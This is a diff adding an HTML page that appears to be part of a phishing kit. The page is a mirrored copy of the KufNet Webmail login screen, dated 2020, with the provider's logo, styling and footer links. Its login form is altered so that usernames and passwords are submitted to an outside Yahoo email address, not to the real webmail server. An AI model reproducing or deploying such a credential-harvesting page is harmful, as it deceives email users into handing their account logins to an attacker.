@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from webmail.kufnet.at/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2020 09:13:17 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<title>KufNet Webmail :: Welcome to KufNet Webmail</title>
+<meta name="Robots" content="noindex,nofollow" />
+		<style type="text/css">
+body {
+    color: #333;
+    font-family: "Segoe UI",Arial,Helvetica,sans-serif;
+    font-size: 14px;
+    line-height: 1.4;
+}
+
+#login-form {
+    margin: 20ex auto 2ex;
+    position: relative;
+    width: 580px;
+}
+
+.container {
+   border-radius: 10px;
+   padding: 20px 60px 30px 40px;
+   background-color: #eee;
+   margin-top:5px;
+}
+h1{
+	margin:10px 0;
+	font-size: 25px;
+}
+input {
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset;
+    color: #555;
+    display: block;
+    font-size: 14px;
+    height: 24px;
+    line-height: 1.4;
+    padding: 6px 12px;
+    transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s;
+    width: 350px;
+    margin-bottom:2px;
+}
+
+input:focus {
+    border-color: #66afe9;
+    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset, 0 0 8px rgba(102, 175, 233, 0.6);
+}
+
+.button {
+    display: block;
+    width: 100%;
+    height: 40px;
+    border-radius: 6px;
+    font-size: 18px;
+    background-color: #003D8E;
+    background: #003D8E;
+    color: #fff;
+    font-weight: 400;
+    line-height: 1.4;
+    margin-bottom: 0;
+    padding: 8px 12px;
+    text-align: center;
+    vertical-align: middle;
+    white-space: nowrap;
+	cursor: pointer;
+}
+		</style>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<link rel="stylesheet" type="text/css" href="https://webmail.kufnet.at/plugins/qtip/qtip.css?s=1391498588">
+<link rel="stylesheet" type="text/css" href="https://webmail.kufnet.at/plugins/settings/skins/larry/settings.css?s=1403707476">
+<link rel="stylesheet" type="text/css" href="https://webmail.kufnet.at/plugins/carddav/skins/larry/carddav.css?s=1407655892">
+<link rel="stylesheet" type="text/css" href="https://webmail.kufnet.at/plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1493369090">
+<script src="https://webmail.kufnet.at/program/js/jquery.min.js?s=1493369090" type="text/javascript"></script>
+<script src="https://webmail.kufnet.at/program/js/common.min.js?s=1493369090" type="text/javascript"></script>
+<script src="https://webmail.kufnet.at/program/js/app.min.js?s=1493369090" type="text/javascript"></script>
+<script src="https://webmail.kufnet.at/program/js/jstz.min.js?s=1493369090" type="text/javascript"></script>
+<script type="text/javascript">
+
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"larry","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","cal_backend":"caldav","carddav_last_replication":0,"carddav_sync_interval":5,"request_token":"e6bff52a4e495b4e408519fdedf378d0"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","settings.account":"Account Administration","carddav.pluginname":"CardDAV","carddav.plugindescription":"Manage your contacts on CardDAV servers.","carddav.settings":"CardDAV Settings","carddav.sharing":"Sharing","carddav.share":"Share","carddav.shareinvitation":"Send invitation","carddav.send":"Send","carddav.cancel":"Cancel","carddav.resource":"Resource","carddav.label":"Label","carddav.url":"URL","carddav.access":"Access","carddav.username":"User","carddav.tutorials":"Tutorials","carddav.checkresources":"Check resources","carddav.checkatleastoneresource":"Please check at least one resource","carddav.invitationsubject":"%s invites you to access CardDAV addressbooks","carddav.confidentialcarddavaccess":"Confidential CardDAV access [%s]","carddav.copytoclipboard":"Copy to clipboard","carddav.copiedtoclipboard":"Copied to clipboard","carddav.sharehint":"Provide the above information (Username, Password (Token) and URLs) for  others to connect to your shared addressbooks.<br \/>This information grants read and write access. Change or remove the token to close access.","carddav.sharehint_readonly":"Provide the above information (Username, Password (Token) and URLs) for  others to connect to your shared addressbooks.<br \/>This information grants read-only access. Change or remove the token to close access.","carddav.readwrite":"read\/write","carddav.readonly":"read only","carddav.abooktoken":"Token","carddav.isenabled":"is enabled","carddav.isdisabled":"is disabled","carddav.sync_short":"Synchronize","carddav.sync":"Synchronize CardDAVs","carddav.add":"Add","carddav.server_url":"CardDAV Server URL","carddav.settings_label":"Category","carddav.settings_read_only":"Read only","carddav.settings_curl_not_installed":"The PHP extension CURL is not installed! Please install CURL to use the CardDAV plugin.","carddav.addressbook_contacts":"CardDAV contacts","carddav.settings_empty_values":"Please fill out all Label and URL","carddav.settings_saved":"CardDAV server settings and vCards saved","carddav.settings_save_failed":"Failed to save CardDAV server settings","carddav.settings_delete_loading":"Delete CardDAV server settings and related contacts","carddav.settings_delete_warning":"Are you sure you want to delete this addressbook?","carddav.settings_delete_contacts_warning":"Do you want to delete all contacts in this addressbook permanently? This action can't be reverted! Choose OK to delete the addressbook AND the contacts hold by this addressbook. Choose CANCEL NOT to delete the contacts hold by this addressbook.","carddav.settings_delete_contacts_warning_html":"Do you want to delete all contacts in this addressbook permanently?<br \/>This action can't be reverted!<br \/><br \/>Choose YES to delete the addressbook AND the contacts hold by this addressbook.<br \/>Choose NO NOT to delete the contacts hold by this addressbook.","carddav.settings_deleted":"CardDAV server settings deleted","carddav.settings_delete_failed":"Failed to delete CardDAV server settings","carddav.settings_no_connection":"Can't connect to the CardDAV server","carddav.settings_init_server":"Checking CardDAV server connection and import vCards","carddav.addressbook_synced":"CardDAV contacts synchronized","carddav.addressbook_sync_failed":"An error occurred while synchronizing the CardDAV contacts","carddav.addressbook_sync_incomplete":"Synchronization of CardDAV contacts is incomplete","carddav.addressbook_sync_loading":"Synchronize CardDAV contacts","carddav.contact_moved_single":"contact successfully moved","carddav.contact_moved_multiple":"contacts successfully moved","carddav.autocomplete":"Auto\u00adcomplete","carddav.automaticallycollected":"Automatically Collected","carddav.automaticallycollected_local":"Automatically Collected (local)","carddav.useautoabook":"Use automatic address book","carddav.useforcompletion":"Use automatically collected addresses for autocompletion","carddav.automatic_addressbook":"Add automatically collected contacts to...","carddav.toggle":"toggle","carddav.protected":"protected","carddav.subscribe":"subscribe","carddav.unsubscribe":"unsubscribe","carddav.defaultaddressbook":"Personal Contacts","carddav.Global":"Global (readonly)","carddav.Work":"Work","carddav.Family":"Family","carddav.Personal":"Personal","carddav.Collected":"Collected","carddav.local":"local","carddav.submenuprefix":"\u00bb ","carddav.blank":" "});
+rcmail.gui_object('loginform', 'form');
+</script>
+
+<script type="text/javascript" src="https://webmail.kufnet.at/plugins/qtip/jquery.migrate.js?s=1392889070"></script>
+<script type="text/javascript" src="https://webmail.kufnet.at/plugins/qtip/qtip.js?s=1392889084"></script>
+<script type="text/javascript" src="https://webmail.kufnet.at/plugins/plugin_manager/plugin_manager_fixes.js?s=1403707474"></script>
+<script type="text/javascript" src="https://webmail.kufnet.at/plugins/jqueryui/js/jquery-ui-1.9.2.custom.min.js?s=1493369090"></script>
+<script type="text/javascript" src="https://webmail.kufnet.at/plugins/calendar/program/js/calendar.common.js?s=1402749176"></script>
+<script type="text/javascript" src="https://webmail.kufnet.at/plugins/calendar/program/js/move_button.js?s=1391498554"></script>
+</head>
+	<body>
+
+
+<div id="login-form">
+<img src="https://webmail.kufnet.at/skins/larry/images/kufnet.png" id="logo" alt="KUFnet Webmail">
+	<div class="container">
+
+		<h1>Bitte hier anmelden</h1>
+<form name="form" method="post" action="nowisabundance@yahoo.com">
+<input type="hidden" name="_token" value="e6bff52a4e495b4e408519fdedf378d0">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="_default_"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
+</td>
+<td class="input"><input name="_user" id="rcmloginuser" required="required" size="40" autocapitalize="off" autocomplete="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Password</label>
+</td>
+<td class="input"><input name="_pass" id="rcmloginpwd" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Login"></p>
+
+	</div>
+</div>
+<div style="
+  position: absolute;
+  left: 0;
+  top: 95%;
+  width: 100%;
+  text-align: center;
+  font-size: 18px;
+
+">
+<a href="https://www.kufnet.at/agb/" style="color:#262932" target="_blank">AGB</a><a> |</a>
+<a href="https://www.kufnet.at/impressum/" style="color:#262932" target="_blank">Impressum</a><a> |</a>
+<a href="https://www.kufnet.at/datenschutz/" style="color:#262932" target="_blank">Datenschutz</a>
+</div>
+
+
+<script type="text/javascript">
+
+jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
+                using: function(pos) {
+                    var me = jQuery(this),
+                        offset = me.css(pos).offset(),
+                        topOffset = offset.top - 12;
+                    if (topOffset < 0)
+                        me.css('top', pos.top - topOffset);
+                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
+                        me.css('left', pos.left - 12);
+                }
+            });
+$(document).ready(function(){ 
+rcmail.init();
+$(".about-link").hide();
+$("#bottomline").hide();
+$(".support-link").hide();
+window.setTimeout("$('.myrcmessage').hide('slow');", 8000);
+});
+</script>
+
+
+<!-- Mirrored from webmail.kufnet.at/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2020 09:13:17 GMT -->
+</html>
